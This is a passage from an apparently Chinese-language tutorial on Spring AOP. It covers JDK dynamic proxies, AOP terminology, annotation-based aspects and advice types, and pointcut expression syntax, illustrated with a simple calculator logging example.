class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxyFactory</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * newProxyInstance()：创建一个代理实例</span></span><br><span class="line"><span class="comment">         * 其中有三个参数：</span></span><br><span class="line"><span class="comment">         * 1、classLoader：加载动态生成的代理类的类加载器</span></span><br><span class="line"><span class="comment">         * 2、interfaces：目标对象实现的所有接口的class对象所组成的数组</span></span><br><span class="line"><span class="comment">         * 3、invocationHandler：设置代理对象实现目标对象方法的过程，即代理类中如何重写接口中的抽象方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> target.getClass().getClassLoader();</span><br><span class="line">        Class&lt;?&gt;[] interfaces = target.getClass().getInterfaces();</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">                <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * proxy：代理对象</span></span><br><span class="line"><span class="comment">                 * method：代理对象需要实现的方法，即其中需要重写的方法</span></span><br><span class="line"><span class="comment">                 * args：method所对应方法的参数</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[动态代理][日志] &quot;</span>+method.getName()+<span class="string">&quot;，参数：&quot;</span>+ Arrays.toString(args));</span><br><span class="line">                     result = method.invoke(target, args);</span><br><span class="line">                     System.out.println(<span class="string">&quot;[动态代理][日志] &quot;</span>+method.getName()+<span class="string">&quot;，结 果：&quot;</span>+ result);</span><br><span class="line">                 &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">                   System.out.println(<span class="string">&quot;[动态代理][日志] &quot;</span>+method.getName()+<span class="string">&quot;，异常：&quot;</span>+e.getMessage());</span><br><span class="line">                  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                      System.out.println(<span class="string">&quot;[动态代理][日志] &quot;</span>+method.getName()+<span class="string">&quot;，方法执行完毕&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">               &#125;   </span><br><span class="line">            &#125;;    </span><br><span class="line">            <span class="keyword">return</span> Proxy.newProxyInstance(classLoader, interfaces,invocationHandler);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;                                     </span><br></pre></td></tr></table></figure><h3 id="3-2-4、测试"><a href="#3-2-4、测试" class="headerlink" title="3.2.4、测试"></a>3.2.4、测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDynamicProxy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ProxyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyFactory</span>(<span class="keyword">new</span> <span class="title class_">CalculatorLogImpl</span>());</span><br><span class="line">    <span class="type">Calculator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Calculator) factory.getProxy();</span><br><span class="line">    proxy.div(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//proxy.div(1,1);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3、AOP概念及相关术语"><a href="#3-3、AOP概念及相关术语" class="headerlink" title="3.3、AOP概念及相关术语"></a>3.3、AOP概念及相关术语</h2><h3 id="3-3-1、概述"><a href="#3-3-1、概述" class="headerlink" title="3.3.1、概述"></a>3.3.1、概述</h3><p>AOP（Aspect Oriented Programming）是一种设计思想，是软件设计领域中的面向切面编程，它是面向对象编程的一种补充和完善，它以通过预编译方式和运行期动态代理方式实现在不修改源代码的情况下给程序动态统一添加额外功能的一种技术。</p><h3 id="3-3-2、相关术语"><a href="#3-3-2、相关术语" class="headerlink" title="3.3.2、相关术语"></a>3.3.2、相关术语</h3><h4 id="①横切关注点"><a href="#①横切关注点" class="headerlink" title="①横切关注点"></a>①横切关注点</h4><p>从每个方法中抽取出来的同一类非核心业务。在同一个项目中，我们可以使用多个横切关注点对相关方法进行多个不同方面的增强。</p><p>这个概念不是语法层面天然存在的，而是根据附加功能的逻辑上的需要：有十个附加功能，就有十个横切关注点。<img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/20.png"></p><h4 id="②通知"><a href="#②通知" class="headerlink" title="②通知"></a>②通知</h4><p>每一个横切关注点上要做的事情都需要写一个方法来实现，这样的方法就叫通知方法。</p><ul><li>前置通知：在被代理的目标方法<strong>前</strong>执行</li><li>返回通知：在被代理的目标方法<strong>成功结束</strong>后执行（<strong>寿终正寝</strong>）</li><li>异常通知：在被代理的目标方法<strong>异常结束</strong>后执行（<strong>死于非命</strong>）</li><li>后置通知：在被代理的目标方法<strong>最终结束</strong>后执行（<strong>盖棺定论</strong>）</li><li>环绕通知：使用try…catch…finally结构围绕<strong>整个</strong>被代理的目标方法，包括上面四种通知对应的所</li></ul><p>有位置<img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/21.png"></p><h4 id="③切面"><a href="#③切面" class="headerlink" title="③切面"></a>③切面</h4><p>封装通知方法的类。<img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/22.png"></p><h4 id="④目标"><a href="#④目标" class="headerlink" title="④目标"></a>④目标</h4><p>被代理的目标对象。</p><h4 id="⑤代理"><a href="#⑤代理" class="headerlink" title="⑤代理"></a>⑤代理</h4><p>向目标对象应用通知之后创建的代理对象。</p><h4 id="⑥连接点"><a href="#⑥连接点" class="headerlink" title="⑥连接点"></a>⑥连接点</h4><p>这也是一个纯逻辑概念，不是语法定义的。</p><p>把方法排成一排，每一个横切位置看成x轴方向，把方法从上到下执行的顺序看成y轴，x轴和y轴的交叉点就是连接点。</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/23.png"></p><h4 id="⑦切入点"><a href="#⑦切入点" class="headerlink" title="⑦切入点"></a>⑦切入点</h4><p>定位连接点的方式。</p><p>每个类的方法中都包含多个连接点，所以连接点是类中客观存在的事物（从逻辑上来说）。</p><p>如果把连接点看作数据库中的记录，那么切入点就是查询记录的 SQL 语句。</p><p>Spring 的 AOP 技术可以通过切入点定位到特定的连接点。</p><p>切点通过 org.springframework.aop.Pointcut 接口进行描述，它使用类和方法作为连接点的查询条</p><p>件。</p><h3 id="3-3-3、作用"><a href="#3-3-3、作用" class="headerlink" title="3.3.3、作用"></a>3.3.3、作用</h3><ul><li><p>简化代码：把方法中固定位置的重复的代码<strong>抽取</strong>出来，让被抽取的方法更专注于自己的核心功能，提高内聚性。</p></li><li><p>代码增强：把特定的功能封装到切面类中，看哪里有需要，就往上套，被<strong>套用</strong>了切面逻辑的方法就被切面给增强了。</p></li></ul><h2 id="3-4、基于注解的AOP"><a href="#3-4、基于注解的AOP" class="headerlink" title="3.4、基于注解的AOP"></a>3.4、基于注解的AOP</h2><h3 id="3-4-1、技术说明"><a href="#3-4-1、技术说明" class="headerlink" title="3.4.1、技术说明"></a>3.4.1、技术说明</h3><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/24.png"></p><ul><li>动态代理（InvocationHandler）：JDK原生的实现方式，需要被代理的目标类必须实现接口。因</li></ul><p>为这个技术要求<strong>代理对象和目标对象实现同样的接口</strong>（兄弟两个拜把子模式）。</p><ul><li><p>cglib：通过<strong>继承被代理的目标类</strong>（认干爹模式）实现代理，所以不需要目标类实现接口。</p></li><li><p>AspectJ：本质上是静态代理，<strong>将代理逻辑“织入”被代理的目标类编译得到的字节码文件</strong>，所以最终效果是动态的。weaver就是织入器。Spring只是借用了AspectJ中的注解。</p></li></ul><h3 id="3-4-2、准备工作"><a href="#3-4-2、准备工作" class="headerlink" title="3.4.2、准备工作"></a>3.4.2、准备工作</h3><h4 id="①添加依赖"><a href="#①添加依赖" class="headerlink" title="①添加依赖"></a>①添加依赖</h4><p>在IOC所需依赖基础上再加入下面依赖即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- spring-aspects会帮我们传递过来aspectjweaver --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="②准备被代理的目标资源"><a href="#②准备被代理的目标资源" class="headerlink" title="②准备被代理的目标资源"></a>②准备被代理的目标资源</h4><p>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorPureImpl</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i + j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i - j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i * j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i / j;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法内部 result = &quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-3、创建切面类并配置"><a href="#3-4-3、创建切面类并配置" class="headerlink" title="3.4.3、创建切面类并配置"></a>3.4.3、创建切面类并配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @Aspect表示这个类是一个切面类</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="comment">// @Component注解保证这个切面类能够放入IOC容器</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAspect</span> &#123;</span><br><span class="line">    <span class="meta">@Before(&quot;execution(public int com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeMethod</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line"><span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> Arrays.toString(joinPoint.getArgs());</span><br><span class="line">System.out.println(<span class="string">&quot;Logger--&gt;前置通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，参数：&quot;</span>+args);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">@After(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterMethod</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">System.out.println(<span class="string">&quot;Logger--&gt;后置通知，方法名：&quot;</span>+methodName);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">@AfterReturning(value = &quot;execution(*com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, returning = &quot;result&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturningMethod</span><span class="params">(JoinPoint joinPoint, Object result)</span>&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">System.out.println(<span class="string">&quot;Logger--&gt;返回通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，结果：&quot;</span>+result);</span><br><span class="line">&#125; </span><br><span class="line">    <span class="meta">@AfterThrowing(value = &quot;execution(*com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, throwing = &quot;ex&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowingMethod</span><span class="params">(JoinPoint joinPoint, Throwable ex)</span>&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">System.out.println(<span class="string">&quot;Logger--&gt;异常通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，异常：&quot;</span>+ex);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">@Around(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">aroundMethod</span><span class="params">(ProceedingJoinPoint joinPoint)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line"><span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> Arrays.toString(joinPoint.getArgs());</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法执行之前&quot;</span>);</span><br><span class="line">            <span class="comment">//目标对象（连接点）方法的执行</span></span><br><span class="line">            result = joinPoint.proceed();</span><br><span class="line">            System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法返回值之后&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            throwable.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法出现异常时&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;环绕通知--&gt;目标对象方法执行完毕&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Spring的配置文件中配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        基于注解的AOP的实现：</span></span><br><span class="line"><span class="comment">        1、将目标对象和切面交给IOC容器管理（注解+扫描）</span></span><br><span class="line"><span class="comment">        2、开启AspectJ的自动代理，为目标对象自动生成代理</span></span><br><span class="line"><span class="comment">        3、将切面类通过注解@Aspect标识</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu.aop.annotation&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-4-4、各种通知"><a href="#3-4-4、各种通知" class="headerlink" title="3.4.4、各种通知"></a>3.4.4、各种通知</h3><ul><li>前置通知：使用@Before注解标识，在被代理的目标方法<strong>前</strong>执行</li><li>返回通知：使用@AfterReturning注解标识，在被代理的目标方法<strong>成功结束</strong>后执行（<strong>寿终正寝</strong>）</li><li>异常通知：使用@AfterThrowing注解标识，在被代理的目标方法<strong>异常结束</strong>后执行（<strong>死于非命</strong>）</li><li>后置通知：使用@After注解标识，在被代理的目标方法<strong>最终结束</strong>后执行（<strong>盖棺定论</strong>）</li><li>环绕通知：使用@Around注解标识，使用try…catch…finally结构围绕<strong>整个</strong>被代理的目标方法，包</li></ul><p>括上面四种通知对应的所有位置</p><blockquote><p>各种通知的执行顺序：</p><ul><li>Spring版本5.3.x以前：<ul><li>前置通知</li><li>目标操作</li><li>后置通知</li><li>返回通知或异常通知</li></ul></li><li>Spring版本5.3.x以后：<ul><li>前置通知</li><li>目标操作</li><li>返回通知或异常通知</li><li>后置通知</li></ul></li></ul></blockquote><h3 id="3-4-5、切入点表达式语法"><a href="#3-4-5、切入点表达式语法" class="headerlink" title="3.4.5、切入点表达式语法"></a>3.4.5、切入点表达式语法</h3><h4 id="①作用"><a href="#①作用" class="headerlink" title="①作用"></a>①作用</h4><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/25.png"></p><h4 id="②语法细节"><a href="#②语法细节" class="headerlink" title="②语法细节"></a>②语法细节</h4><ul><li>用*号代替“权限修饰符”和“返回值”部分表示“权限修饰符”和“返回值”不限</li><li>在包名的部分，一个“<em>”号只能代表包的层次结构中的一层，表示这一层是任意的。</em><ul><li><em>例如：</em>.Hello匹配com.Hello，不匹配com.atguigu.Hello</li></ul></li><li>在包名的部分，使用“*..”表示包名任意、包的层次深度任意*</li><li><em>在类名的部分，类名部分整体用</em>号代替，表示类名任意</li><li>在类名的部分，可以使用<em>号代替类名的一部分</em><ul><li><em>例如：</em>Service匹配所有名称以Service结尾的类或接口</li></ul></li><li>在方法名部分，可以使用<em>号表示方法名任意</em></li><li><em>在方法名部分，可以使用</em>号代替方法名的一部分<ul><li>例如：*Operation匹配所有方法名以Operation结尾的方法</li></ul></li><li>​在方法参数列表部分，使用(..)表示参数列表任意</li><li>在方法参数列表部分，使用(int,..)表示参数列表以一个int类型的参数开头</li><li>在方法参数列表部分，基本数据类型和对应的包装类型是不一样的<ul><li>切入点表达式中使用 int 和实际方法中 Integer 是不匹配的</li></ul></li><li>在方法返回值部分，如果想要明确指定一个返回值类型，那么必须同时写明权限修饰符<ul><li>例如：execution(public int <em>..<em>Service.</em>(.., int)) 正确</em></li><li><em>例如：execution(</em> int *..<em>Service.</em>(.., int)) 错误</li></ul></li></ul><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/26.png"></p><h3 id="3-4-6、重用切入点表达式"><a href="#3-4-6、重用切入点表达式" class="headerlink" title="3.4.6、重用切入点表达式"></a>3.4.6、重用切入点表达式</h3><h4 id="①声明"><a href="#①声明" class="headerlink" title="①声明"></a>①声明</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(* com.atguigu.aop.annotation.*.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="②在同一个切面中使用"><a href="#②在同一个切面中使用" class="headerlink" title="②在同一个切面中使用"></a>②在同一个切面中使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeMethod</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> Arrays.toString(joinPoint.getArgs());</span><br><span class="line">    System.out.println(<span class="string">&quot;Logger--&gt;前置通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，参数：&quot;</span>+args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③在不同切面中使用"><a href="#③在不同切面中使用" class="headerlink" title="③在不同切面中使用"></a>③在不同切面中使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;com.atguigu.aop.CommonPointCut.pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeMethod</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> Arrays.toString(joinPoint.getArgs());</span><br><span class="line">    System.out.println(<span class="string">&quot;Logger--&gt;前置通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，参数：&quot;</span>+args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-7、获取通知的相关信息"><a href="#3-4-7、获取通知的相关信息" class="headerlink" title="3.4.7、获取通知的相关信息"></a>3.4.7、获取通知的相关信息</h3><h4 id="①获取连接点信息"><a href="#①获取连接点信息" class="headerlink" title="①获取连接点信息"></a>①获取连接点信息</h4><p>获取连接点信息可以在通知方法的参数位置设置JoinPoint类型的形参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;execution(public int com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeMethod</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">    <span class="comment">//获取连接点的签名信息</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    <span class="comment">//获取目标方法到的实参信息</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> Arrays.toString(joinPoint.getArgs());</span><br><span class="line">    System.out.println(<span class="string">&quot;Logger--&gt;前置通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，参数：&quot;</span>+args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②获取目标方法的返回值"><a href="#②获取目标方法的返回值" class="headerlink" title="②获取目标方法的返回值"></a>②获取目标方法的返回值</h4><p>@AfterReturning中的属性returning，用来将通知方法的某个形参，接收目标方法的返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(value = &quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, returning = &quot;result&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturningMethod</span><span class="params">(JoinPoint joinPoint, Object result)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> joinPoint.getSignature().getName();</span><br><span class="line">    System.out.println(<span class="string">&quot;Logger--&gt;返回通知，方法名：&quot;</span>+methodName+<span class="string">&quot;，结果：&quot;</span>+result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③获取目标方法的异常"><a href="#③获取目标方法的异常" class="headerlink" title="③获取目标方法的异常"></a>③获取目标方法的异常</h4><p>@AfterThrowing中的属性throwing，用来将通知方法的某个形参，接收目标方法的异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(value = &quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, throwing = &quot;ex&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowingMethod</span><span class="params">(JoinPoint joinPoint, Throwable ex)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span 